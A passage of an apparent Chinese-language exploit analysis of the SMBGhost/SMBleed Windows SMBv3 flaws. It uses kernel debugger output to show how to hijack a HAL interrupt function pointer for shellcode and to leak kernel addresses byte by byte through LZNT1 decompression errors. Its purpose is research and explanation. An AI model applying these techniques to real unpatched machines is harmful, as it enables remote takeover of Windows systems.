   +0x000 CopyOnWrite      : 0y0
   +0x000 Unused           : 0y0
   +0x000 Write            : 0y1
   +0x000 PageFrameNumber  : 0y000000000000000000000001001110110010 (0x13b2)
   +0x000 ReservedForHardware : 0y0000
   +0x000 ReservedForSoftware : 0y0000
   +0x000 WsleAge          : 0y0000
   +0x000 WsleProtection   : 0y000
   +0x000 NoExecute        : 0y0
```

**寻找HAL：**

HAL堆是在HAL.DLL引导过程中创建的，HAL堆上存放了HalpInterruptController（目前也是随机化的），其中保存了一些函数指针，其偏移0x78处存放了hal!HalpApicRequestInterrupt函数指针。这个函数和中断相关，会被系统一直调用，所以可通过覆盖这个指针劫持执行流程。

```
0: kd&gt; dq poi(hal!HalpInterruptController)
fffff7e6`80000698  fffff7e6`800008f0 fffff802`04486e50
fffff7e6`800006a8  fffff7e6`800007f0 00000000`00000030
fffff7e6`800006b8  fffff802`04422d80 fffff802`04421b90
fffff7e6`800006c8  fffff802`04422520 fffff802`044226e0
fffff7e6`800006d8  fffff802`044226b0 00000000`00000000
fffff7e6`800006e8  fffff802`044223c0 00000000`00000000
fffff7e6`800006f8  fffff802`04454560 fffff802`04432770
fffff7e6`80000708  fffff802`04421890 fffff802`0441abb0

0: kd&gt; u fffff802`0441abb0
hal!HalpApicRequestInterrupt:
fffff802`0441abb0 48896c2420      mov     qword ptr [rsp+20h],rbp
fffff802`0441abb5 56              push    rsi
fffff802`0441abb6 4154            push    r12
fffff802`0441abb8 4156            push    r14
fffff802`0441abba 4883ec40        sub     rsp,40h
fffff802`0441abbe 488bb42480000000 mov     rsi,qword ptr [rsp+80h]
fffff802`0441abc6 33c0            xor     eax,eax
fffff802`0441abc8 4532e4          xor     r12b,r12b

```

可通过遍历物理页找到HalpInterruptController地址，如下所示，在虚拟机调试环境下该地址位于第一个物理页。在获得这个地址后，可通过0x78偏移找到alpApicRequestInterrupt函数指针地址，覆盖这个地址为Shellcode地址0xfffff78000000800，等待劫持执行流程。

```
1: kd&gt; !dq 1000
#    1000 00000000`00000000 00000000`00000000
#    1010 00000000`01010600 00000000`00000000
#    ......
#    18f0 fffff7e6`80000b20 fffff7e6`80000698
#    1900 fffff7e6`80000a48 00000000`00000004
```

**Shellcode复制&amp;&amp;执行：**

通过任意地址写将Shellcode复制到0xfffff78000000800，等待“alpApicRequestInterrupt函数”被调用。

```
0: kd&gt; g
Breakpoint 0 hit
fffff780`00000800 55              push    rbp

0: kd&gt; k
 # Child-SP          RetAddr               Call Site
00 fffff800`482b24c8 fffff800`450273a0     0xfffff780`00000800
01 fffff800`482b24d0 fffff800`4536c4b8     hal!HalSendNMI+0x330
02 fffff800`482b2670 fffff800`4536bbee     nt!KiSendFreeze+0xb0
03 fffff800`482b26d0 fffff800`45a136ac     nt!KeFreezeExecution+0x20e
04 fffff800`482b2800 fffff800`45360811     nt!KdEnterDebugger+0x64
05 fffff800`482b2830 fffff800`45a17105     nt!KdpReport+0x71
06 fffff800`482b2870 fffff800`451bbbf0     nt!KdpTrap+0x14d
07 fffff800`482b28c0 fffff800`451bb85f     nt!KdTrap+0x2c
08 fffff800`482b2900 fffff800`45280202     nt!KiDispatchException+0x15f
```



## SMBGhost&amp;&amp;SMBleed远程代码执行

Zecops利用思路的灵魂是通过判断LZNT1解压是否成功来泄露单个字节，有点爆破的意思在里面。

### <a class="reference-link" name="LZNT1%E8%A7%A3%E5%8E%8B%E7%89%B9%E6%80%A7"></a>LZNT1解压特性

通过逆向可以发现LZNT1压缩数据由压缩块组成，每个压缩块有两个字节的块头部，通过最高位是否设置可判断该块是否被压缩，其与0xFFF相与再加3（2字节的chunk header+1字节的flag）为这个压缩块的长度。每个压缩块中有若干个小块，每个小块开头都有存放标志的1字节数据。该字节中的每个比特控制后面的相应区域，是直接复制(0)还是重复复制(1)。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t015eaa9d21db0f7e3a.png)

这里先举个后面会用到的例子，如下所示。解压时首先取出2个字节的块头部0xB007，0xB007&amp;0xFFF+3=0xa，所以这个块的大小为10，就是以下这10个字节。然后取出标志字节0x14，其二进制为00010100，对应了后面的8项数据，如果相应的比特位为0，就直接将该字节项复制到待解压缓冲区，如果相应比特位为1，表示数据有重复，从相应的偏移取出两个字节数据，根据环境计算出复制的源地址和复制的长度。

[![](https://p0.ssl.qhimg.com/t015d9f6b776f627aed.png)](https://p0.ssl.qhimg.com/t015d9f6b776f627aed.png)

由于0x14的前两个比特为0，b0 00 直接复制到目标缓冲区，下一个比特位为1，则取出0x007e，复制0x7e+3（0x81）个 00 到目标缓冲区，然后下一个比特位是0，复制ff到目标缓冲区，下个比特位为1，所以又取出0x007c，复制0x7c+3（0x7f）个 FF 到目标缓冲区，由于此时已走到边界点，对该压缩块的解压结束。以下为解压结果：

```
kd&gt; db ffffa508`31ac115e lff+3+1
ffffa508`31ac115e  b0 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac116e  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac117e  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac118e  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac119e  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac11ae  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac11be  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac11ce  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac11de  00 00 00 ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac11ee  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac11fe  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac120e  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac121e  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac122e  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac123e  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac124e  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac125e  ff ff ff                                         ...
```

Zecops在文章中提出可通过向目标发送压缩测试数据并检测该连接是否断开来判断是否解压失败，如果解压失败，则连接断开，而利用LZNT1解压的特性可通过判断解压成功与否来泄露1字节数据。下面来总结解压成功和解压失败的模式。

**00 00 模式：**

文中提示LZNT1压缩数据可以 00 00 结尾（类似于以NULL终止的字符串，可选的）。如下所示，当读取到的长度为0时跳出循环，在比较了指针没有超出边界之后，正常退出函数。

```
// RtlDecompressBufferLZNT1
    v11 = *(_WORD *)compressed_data_point; 
    if ( !*(_WORD *)compressed_data_point )
      break;
    ......
  `}`
  v17 = *(_DWORD **)&amp;a6; 
  if ( compressed_data_point &lt;= compressed_data_boundary )
  `{`
    **(_DWORD **)&amp;a6 = (_DWORD)decompress_data_p2 - decompress_data_p1;
    goto LABEL_15;
  `}`
LABEL_32:
  v10 = 0xC0000242;                             // 错误流程
  *v17 = (_DWORD)compressed_data_point;
LABEL_15:
  if ( _InterlockedExchangeAdd((volatile signed __int32 *)&amp;v23, 0xFFFFFFFF) == 1 )
    KeSetEvent(&amp;Event, 0, 0);
  KeWaitForSingleObject(&amp;Event, Executive, 0, 0, 0i64);
  if ( v10 &gt;= 0 &amp;&amp; v23 &lt; 0 )
    v10 = HIDWORD(v23);
  return (unsigned int)v10;
`}`
```

**XX XX FF FF FF模式：**

满足XX XX FF FF FF模式的压缩块会在解压时产生错误，其中，XXXX&amp;FFF&gt;0且第二个XX的最高位为1。作者在进行数据泄露的时候使用的FF FF满足此条件，关键代码如下，当标志字节为FF时，由于第一个标志位被设置，会跳出上面的循环，然后取出两个字节的0xFFFF。由于比较第一个比特位的时候就跳出循环，decompress_data_p1、decompress_data_p2 和 decompress_data_p3 都指向原始的目标缓冲区（本来也就是起点）。所以 v11 也是初始值 0xD，v14（v15）为标志位1相应的双字0xFFFF。由于decompress_data_p1 – 0xFFFF &gt;&gt; 0xD -1 肯定小于decompress_data_p2，会返回错误码 0xC0000242。

```
if ( *compressed_data_p1 &amp; 1 )
        break;
   *decompress_data_p1 = compressed_data_p1[1];
   ......
`}`
while ( decompress_data_p1 &gt; decompress_data_p3 )
`{`
   v11 = (unsigned int)(v11 - 1);
   decompress_data_p3 = (_BYTE *)(dword_14037B700[v11] + decompress_data_p2);
`}`
v13 = compressed_data_p1 + 1;
v14 = *(_WORD *)(compressed_data_p1 + 1);
v15 = v14;
v17 = dword_14037B744[v11] &amp; v14;
v11 = (unsigned int)v11;
v16 = v17;
v18 = &amp;decompress_data_p1[-(v15 &gt;&gt; v11) - 1];
if ( (unsigned __int64)v18 &lt; decompress_data_p2 )
    return 0xC0000242i64;

//调试数据
kd&gt; 
nt!LZNT1DecompressChunk+0x66e:
fffff802`52ddd93e 488d743eff      lea     rsi,[rsi+rdi-1]
kd&gt; p
nt!LZNT1DecompressChunk+0x673:
fffff802`52ddd943 493bf2          cmp     rsi,r10
kd&gt; 
nt!LZNT1DecompressChunk+0x676:
fffff802`52ddd946 0f82cd040000    jb      nt!LZNT1DecompressChunk+0xb49 (fffff802`52ddde19)
kd&gt; 
nt!LZNT1DecompressChunk+0xb49:
fffff802`52ddde19 b8420200c0      mov     eax,0C0000242h
```

**单字节泄露思路**

泄露的思路就是利用解压算法的上述特性，在想要泄露的字节后面加上b0（满足压缩标志）以及一定数量的 00 和 FF，00表示的数据为绝对有效数据。当处理完一个压缩块之后，会继续向后取两个字节，如果取到的是00 00，解压就会正常完成，如果是 00 FF 或者 FF FF，解压就会失败。

```
kd&gt; db ffffa508`31ac1158
ffffa508`31ac1158  18 3a 80 34 08 a5 b0 00-00 00 00 00 00 00 00 00  .:.4............
ffffa508`31ac1168  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac1178  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
```

如下所示，a5是想要泄露的字节，先假设可以将测试数据放在后面。根据解压算法可知，首先会取出b0a5，然后和0xfff相与后加3，得到a8，从a5开始数a8个字节，这些数据都属于第一个压缩块。如果要求第二次取出来的双字还是00 00，就需要a8-2+2个字节的00，也就是a5+3。如果00的个数小于x+3，第二次取双字的时候就一定会命中后面的FF，触发错误。采用二分法找到满足条件的x，使得当00的数量为x+3时解压缩正常完成，并且当00的数量为x+2时解压失败，此时得到要泄露的那个字节数据x。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t016ee726994ec9f6ff.png)

下面开始步入正题，一步一步获取关键模块基址，劫持系统执行流程。为了方便描述利用思路，在 Windows 1903 单核系统上进行调试，利用前还需要收集各漏洞版本以下函数在模块中的偏移，以便后续进行匹配，计算相应模块基址及函数地址：

|**srvnet.sys**|**ntoskrnl.exe**
|------
|srvnet!SrvNetWskConnDispatch|nt!IoSizeofWorkItem
|srvnet!imp_IoSizeofWorkItem|nt!MiGetPteAddress
|srvnet!imp_RtlCopyUnicodeString

### <a class="reference-link" name="%E6%B3%84%E9%9C%B2%20User%20Buffer%20%E6%8C%87%E9%92%88"></a>泄露 User Buffer 指针

这一步要泄露的数据是已知大小缓冲区的User Buffer指针（POC中是0x2100）。请求包结构如下，Offset为0x2116，Originalsize为0，由于Offset+Originalsize=0x2116，所以会分配大小为0x4100的User Buffer来存放还原的数据。然而，原始请求包的User Buffer大小为0x2100（可容纳0x10大小的头和0x1101大小的Data），Offset 0x2116明显超出了该缓冲区的长度，在后续的memcpy操作中会存在越界读取。Offset欺骗也是1206的一部分，在取得Offset的值之后没有判断其大小是否超出的User Buffer的界限，从而在解压成功后将这部分数据复制到一个可控的区域。又由于数据未初始化，可利用LZNT1解压将目标指针泄露出来。

[![](https://p3.ssl.qhimg.com/t010c3b8a7fd64be4e9.png)](https://p3.ssl.qhimg.com/t010c3b8a7fd64be4e9.png)

以下为请求包的Srvnet Buffer Header信息，由于复制操作是从Raw Data区域开始（跳过0x10头部），因而越界读取并复制的数据长度为0x2116+0x10-0x2100 = 0x26，这包括存放在Srvnet Buffer Header偏移0x18处的User Buffer指针 0xffffa50836240050。

```
kd&gt; g
request: ffffa508`36240050  424d53fc 00000000 00000001 00002116
srv2!Srv2DecompressData+0x26:
fffff802`51ce7e86 83782410        cmp     dword ptr [rax+24h],10h

kd&gt; dd rax
ffffa508`36242150  2f566798 ffffa508 2f566798 ffffa508
ffffa508`36242160  00010002 00000000 36240050 ffffa508
ffffa508`36242170  00002100 00001111 00002288 c0851000

kd&gt; dd ffffa508`36240050+10+2116-6-10 l8
ffffa508`36242160  00010002 00000000 36240050 ffffa508
ffffa508`36242170  00002100 00001111 00002288 c0851000
```

以下为分配的0x4100的缓冲区，其User Buffer首地址为0xffffa50835a92050：

```
kd&gt; g
alloc: ffffa508`35a92050  cf8b48d6 006207e8 ae394c00 00000288
srv2!Srv2DecompressData+0x85:
fffff802`51ce7ee5 488bd8          mov     rbx,rax
kd&gt; dd rax
ffffa508`35a96150  a1e83024 48fffaef 4810478b 30244c8d
ffffa508`35a96160  00020002 00000000 35a92050 ffffa508
ffffa508`35a96170  00004100 00000000 000042a8 245c8b48
```

由于解压成功，所以进入memcpy流程，0x2100缓冲区的User Buffer指针0xffffa50836240050被复制到0x4100缓冲区偏移0x2108处:

```
kd&gt; dd ffffa508`35a92050 + 2100
ffffa508`35a94150  840fc085 000000af 24848d48 000000a8
ffffa508`35a94160  24448948 548d4120 b9410924 00000eda
kd&gt; p
srv2!Srv2DecompressData+0x10d:
fffff802`51ce7f6d 8b442460        mov     eax,dword ptr [rsp+60h]
kd&gt; dd ffffa508`35a92050 + 2100
ffffa508`35a94150  00010002 00000000 36240050 ffffa508
ffffa508`35a94160  00002100 548d1111 b9410924 00000eda
```

然后下一步是覆盖 0x4100缓冲区中存放的0x2100缓冲区User Buffer Ptr 中 08 a5 后面的ffff等数据（由于地址都是以0xffff开头，所以这两个字节可以不用测）。为了不破坏前面的数据（不执行memcpy），要使得解压失败（在压缩的测试数据后面填充\xFF），但成功解压出测试数据。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01a615b4f9ccb1f20c.png)

以下为解压前后保存的User Buffer Ptr 的状态，可以发现解压后的数据正好满足之前所讲的单字节泄露模式，如果可欺骗程序使其解压0xffffa50835a9415d处的数据，就可以通过多次测试泄露出最高位0xa5：

```
//待解压数据
kd&gt; dd ffffa508`31edb050+10+210e
ffffa508`31edd16e  b014b007 ff007e00 ffff007c ffffffff
ffffa508`31edd17e  ffffffff ffffffff ffffffff ffffffff
ffffa508`31edd18e  ffffffff ffffffff ffffffff ffffffff
ffffa508`31edd19e  ffffffff ffffffff ffffffff ffffffff
ffffa508`31edd1ae  ffffffff ffffffff ffffffff ffffffff
ffffa508`31edd1be  ffffffff ffffffff ffffffff ffffffff
ffffa508`31edd1ce  ffffffff ffffffff ffffffff ffffffff
ffffa508`31edd1de  ffffffff ffffffff ffffffff ffffffff

//解压前数据
kd&gt; db r9 - 6
ffffa508`35a94158  50 00 24 36 08 a5 ff ff-00 21 00 00 11 11 8d 54  P.$6.....!.....T
ffffa508`35a94168  24 09 41 b9 da 0e 00 00-45 8d 44 24 01 48 8b ce  $.A.....E.D$.H..
ffffa508`35a94178  ff 15 c2 68 01 00 85 c0-78 27 8b 94 24 a8 00 00  ...h....x'..$...
ffffa508`35a94188  00 0f b7 c2 c1 e8 08 8d-0c 80 8b c2 c1 e8 10 0f  ................
ffffa508`35a94198  b6 c0 03 c8 0f b6 c2 8d-0c 41 41 3b cf 41 0f 96  .........AA;.A..
ffffa508`35a941a8  c4 48 8d 44 24 30 48 89-44 24 20 ba 0e 00 00 00  .H.D$0H.D$ .....
ffffa508`35a941b8  41 b9 db 0e 00 00 44 8d-42 f4 48 8b ce ff 15 75  A.....D.B.H....u
ffffa508`35a941c8  68 01 00 85 c0 78 2f 8b-54 24 30 0f b7 c2 c1 e8  h....x/.T$0.....

kd&gt; p
srv2!Srv2DecompressData+0xe1:
fffff802`51ce7f41 85c0            test    eax,eax
//解压后数据
kd&gt; db ffffa508`35a9415d lff
ffffa508`35a9415d  a5 b0 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`35a9416d  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`35a9417d  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`35a9418d  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`35a9419d  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`35a941ad  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`35a941bd  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`35a941cd  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`35a941dd  00 00 00 00 ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`35a941ed  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`35a941fd  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`35a9420d  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`35a9421d  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`35a9422d  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`35a9423d  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`35a9424d  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff     ...............

```

控制后续的请求包占用之前布置好的0x4100缓冲区，设置Offset使其指向待泄露的那个字节，利用LZTN1解压算法从高位到低位逐个泄露字节。主要是利用LZTN1解压算法特性以及SMB2协商，在SMB2协商过程中使用LZTN1压缩，对SMB2 SESSION SETUP请求数据进行压缩。构造如下请求，如果LZNT1测试数据解压成功，就代表要泄露的数据不小于0的个数减3，并且由于解压成功，SMB2 SESSION SETUP数据成功被复制。如果解压失败，SMB2 SESSION SETUP数据不会被复制，连接断开。根据连接是否还在调整0的个数，如果连接断开，就增大0的个数，否则减小0的个数，直到找到临界值，泄露出那个字节。

[![](https://p3.ssl.qhimg.com/t01389b99fada11a193.png)](https://p3.ssl.qhimg.com/t01389b99fada11a193.png)

### <a class="reference-link" name="%E6%B3%84%E9%9C%B2srvnet%E5%9F%BA%E5%9D%80"></a>泄露srvnet基址

SRVNET_BUFFER_HDR第一项为ConnectionBufferList.Flink指针（其指向SRVNET_RECV偏移0x58处的ConnectionBufferList.Flink），SRVNET_RECV偏移0x100处存放了AcceptSocket指针。AcceptSocket偏移0x30处为srvnet!SrvNetWskConnDispatch函数指针。可通过泄露这个指针，然后减去已有偏移得到srvnet模块的基址。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t011d677f68026dd913.png)

```
//SRVNET_BUFFER_HDR
kd&gt; dd rax
ffffa508`31221150  2f566798 ffffa508 2f566798 ffffa508
ffffa508`31221160  00030002 00000000 31219050 ffffa508
ffffa508`31221170  00008100 00008100 000082e8 ffffffff
ffffa508`31221180  31219000 ffffa508 312211e0 ffffa508
ffffa508`31221190  00000000 ffffffff 00008100 00000000
ffffa508`312211a0  31221260 ffffa508 31221150 ffffa508

//SRVNET_RECV-&gt;AcceptSocket
kd&gt; dq ffffa5082f566798 - 58 + 100
ffffa508`2f566840  ffffa508`36143c28 00000000`00000000
ffffa508`2f566850  00000000`00000000 ffffa508`3479cd18
ffffa508`2f566860  ffffa508`2f4a6dc0 ffffa508`34ae4170
ffffa508`2f566870  ffffa508`35f56040 ffffa508`34f19520

//srvnet!SrvNetWskConnDispatch
kd&gt; u poi(ffffa508`36143c28+30)
srvnet!SrvNetWskConnDispatch:
fffff802`57d3d170 50              push    rax
fffff802`57d3d171 5a              pop     rdx
fffff802`57d3d172 d15702          rcl     dword ptr [rdi+2],1
fffff802`57d3d175 f8              clc
fffff802`57d3d176 ff              ???
fffff802`57d3d177 ff00            inc     dword ptr [rax]
fffff802`57d3d179 6e              outs    dx,byte ptr [rsi]
fffff802`57d3d17a d15702          rcl     dword ptr [rdi+2],1

```

**泄露ConnectionBufferList.Flink指针**

首先要泄露ConnectionBufferList.Flink指针，以便泄露AcceptSocket指针以及srvnet!SrvNetWskConnDispatch函数指针。在这里使用了另一种思路：使用正常压缩的数据[:-6]覆盖ConnectionBufferList.Flink指针之前数据，这样在解压的时候正好可以带出这6个字节，要注意请求数据长度与Offset+0x10的差值，这个差值应该大于压缩数据+6的长度。在这个过程中需要保持一个正常连接，使得泄露出的ConnectionBufferList所在的SRVNET_RECV结构是有效的。如下所示，解压后的数据长度正好为0x2b，其中，后6位为ConnectionBufferList的低6个字节。

```
kd&gt; g
request: ffffa508`31219050  424d53fc 0000002b 00000001 000080e3
srv2!Srv2DecompressData+0x26:
fffff802`51ce7e86 83782410        cmp     dword ptr [rax+24h],10h

kd&gt; db ffffa508`31219050+80e3+10 l20   //待解压数据
ffffa508`31221143  10 b0 40 41 42 43 44 45-46 1b 50 58 00 18 3a 80  ..@ABCDEF.PX..:.
ffffa508`31221153  34 08 a5 ff ff 18 3a 80-34 08 a5 ff ff 02 00 03  4.....:.4.......

kd&gt; g
srv2!Srv2DecompressData+0xdc:
fffff802`51ce7f3c e86f650406      call    srvnet!SmbCompressionDecompress (fffff802`57d2e4b0)
kd&gt; db r9 l30   //解压前缓冲区
ffffa508`31ac1133  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac1143  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac1153  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
kd&gt; p
srv2!Srv2DecompressData+0xe1:
fffff802`51ce7f41 85c0            test    eax,eax
kd&gt; db ffffa508`31ac1133 l30   //解压后缓冲区
ffffa508`31ac1133  41 42 43 44 45 46 41 42-43 44 45 46 41 42 43 44  ABCDEFABCDEFABCD
ffffa508`31ac1143  45 46 41 42 43 44 45 46-41 42 43 44 45 46 41 42  EFABCDEFABCDEFAB
ffffa508`31ac1153  43 44 45 46 58 18 3a 80-34 08 a5 ff ff ff ff ff  CDEFX.:.4.......
```

然后向目标缓冲区偏移0x810e处解压覆盖测试数据 b0 00 00 … ，之前解压出的0x2b大小的数据放在了偏移0x80e3处，如果要从最后一位开始覆盖，那解压缩的偏移就是0x810e+0x2b（即0x810e）。

```
kd&gt; g
request: ffffa508`31edb050  424d53fc 00007ff2 00000001 0000810e
srv2!Srv2DecompressData+0x26:
fffff802`51ce7e86 83782410        cmp     dword ptr [rax+24h],10h

//解压前
kd&gt; db rdx   //rdx指向待解压数据
ffffa508`31ee316e  07 b0 14 b0 00 7e 00 ff-7c 00 ff ff ff ff ff ff  .....~..|.......
ffffa508`31ee317e  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ee318e  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ee319e  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ee31ae  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ee31be  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ee31ce  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ee31de  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................

kd&gt; db r9-6 l30   //r9指向目标缓冲区
ffffa508`31ac1158  18 3a 80 34 08 a5 ff ff-ff ff ff ff ff ff ff ff  .:.4............
ffffa508`31ac1168  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac1178  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................

//解压后
kd&gt; db ffffa508`31ac1158 l30
ffffa508`31ac1158  18 3a 80 34 08 a5 b0 00-00 00 00 00 00 00 00 00  .:.4............
ffffa508`31ac1168  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac1178  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................

```

然后采用和之前一样的方式泄露该地址低6个字节。根据连接是否断开调整00的长度，直到找到满足临界点的值，从而泄露出ConnectionBufferList。

```
kd&gt; g
request: ffffa508`31ab9050  424d53fc 00008004 00000001 000080fd
srv2!Srv2DecompressData+0x26:
fffff802`51ce7e86 83782410        cmp     dword ptr [rax+24h],10h

kd&gt; db rdx-6 l100
ffffa508`31ac1157  58 18 3a 80 34 08 a5 b0-00 00 00 00 00 00 00 00  X.:.4...........
ffffa508`31ac1167  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac1177  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac1187  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac1197  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac11a7  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac11b7  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac11c7  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
ffffa508`31ac11d7  00 00 00 00 00 00 00 00-00 00 ff ff ff ff ff ff  ................
ffffa508`31ac11e7  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac11f7  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac1207  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac1217  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac1227  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac1237  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
ffffa508`31ac1247  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
```

后面就是继续获取AcceptSocket指针以及srvnet!SrvNetWskConnDispatch函数指针。SrvNetFreeBuffer函数中存在如下代码（有省略），可帮助我们将某地址处的值复制到一个可控的地址。当BufferFlags为3时，pMdl1指向MDL中的MappedSystemVa会变成之前的值加0x50，pMdl2指向的MDL中的StartVa被赋值为pMdl1-&gt;MappedSystemVa + 0x50的高52位，pMdl2指向的MDL中的ByteOffset被赋值为pMdl1-&gt;MappedSystemVa + 0x50的低12位。也就是说pMdl2的StartVa和ByteOffset中会分开存放原先pMdl1中的MappedSystemVa的值加0x50的数据。

```
void SrvNetFreeBuffer(PSRVNET_BUFFER_HDR Buffer)
`{`
    PMDL pMdl1 = Buffer-&gt;pMdl1;
    PMDL pMdl2 = Buffer-&gt;pMdl2;

    if (Buffer-&gt;BufferFlags &amp; 0x02) `{`
        if (Buffer-&gt;BufferFlags &amp; 0x01) `{`
            pMdl1-&gt;MappedSystemVa = (BYTE*)pMdl1-&gt;MappedSystemVa + 0x50；
            pMdl2-&gt;StartVa = (PVOID)((ULONG_PTR)pMdl1-&gt;MappedSystemVa &amp; ~0xFFF)；
            pMdl2-&gt;ByteOffset = pMdl1-&gt;MappedSystemVa &amp; 0xFFF
        `}`

        Buffer-&gt;BufferFlags = 0;

        // ...

        pMdl1-&gt;Next = NULL;
        pMdl2-&gt;Next = NULL;

        // Return the buffer to the lookaside list.
    `}` else `{`
        SrvNetUpdateMemStatistics(NonPagedPoolNx, Buffer-&gt;PoolAllocationSize, FALSE);
        ExFreePoolWithTag(Buffer-&gt;PoolAllocationPtr, '00SL');
    `}`
`}`
```

